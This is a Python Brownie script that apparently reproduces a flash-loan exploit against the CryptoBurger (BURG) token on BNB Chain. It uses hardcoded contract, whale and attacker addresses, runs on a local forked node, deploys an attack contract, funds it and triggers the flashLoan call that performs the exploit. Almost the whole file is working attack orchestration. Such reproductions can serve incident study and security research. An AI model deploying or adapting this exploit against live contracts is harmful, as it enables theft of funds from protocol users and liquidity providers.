from brownie import interface, cryptoBurgerAttack, accounts
from web3 import Web3
import web3


def main():
    deploy()


def deploy():
    burger_address = "0xF40d33DE6737367A1cCB0cE6a056698D993A17E1"
    WBNB = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
    WBNB_WHALE = "0x58f876857a02d6762e0101bb5c46a8c1ed44dc16"
    attacker_eoa = "0x78A8e6C6D7cd1A4d8C40e72Acd0e355a4C62D4c6"

    # Interfaces
    BURG_interface = interface.IERC20(burger_address)
    WBNB_interface = interface.IERC20(WBNB)

    w3 = Web3(
        Web3.HTTPProvider("http://127.0.0.1:8545", request_kwargs={"timeout": 60})
    )

    # Flash Loan amount
    borrow_amount = Web3.toWei(500, "ether")

    # Cover flash loan cost
    # Funded wiht 3% of borrow_amount
    cost_of_borrowing = Web3.toWei(0, "ether")

    # Deploy contract
    contract = cryptoBurgerAttack.deploy({"from": attacker_eoa})

    w3.eth.send_transaction(
        {
            "to": attacker_eoa,
            "from": str(accounts[1]),
            "value": w3.toWei(1, "ether"),
        }
    )

    # Fund contract with WBNB to cover flashloan fee.
    tx = WBNB_interface.transfer(
        contract.address, cost_of_borrowing, {"from": WBNB_WHALE}
    )
    tx.wait(1)

    # Attack tx
    tx = contract.flashLoan(WBNB, borrow_amount, {"from": attacker_eoa})
    tx.wait(1)

    for i in tx.events["LOG"]:
        print(i)

    print(tx.events)
